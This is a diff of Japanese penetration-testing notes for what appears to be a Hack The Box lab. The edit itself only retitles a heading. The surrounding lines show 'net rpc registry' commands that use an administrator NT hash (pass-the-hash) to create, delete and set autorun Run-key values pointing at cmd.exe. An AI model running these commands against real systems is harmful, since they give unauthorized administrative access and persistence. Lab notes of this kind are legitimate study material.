@@ -629,7 +629,7 @@ createkey created HKLM\Software\Microsoft\Windows\CurrentVersion\Run\test
 └─$ net rpc registry deletekey 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run\test' -U 'htb.local/administrator%32693b11e6aa90eb43d32c72a07ceea6' --pw-nt-hash -S 10.129.95.210
 
 ```
-#### registry 
+#### registry setvalue
 ```sh
 #  typeは、sz、multi_sz、dwordのうちのどれかが選べる
 └─$ net rpc registry setvalue 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' 'test' 'SZ' 'C:\Windows\System32\cmd.exe' -U 'htb.local/administrator%32693b11e6aa90eb43d32c72a07ceea6' --pw-nt-hash -S 10.129.95.210 
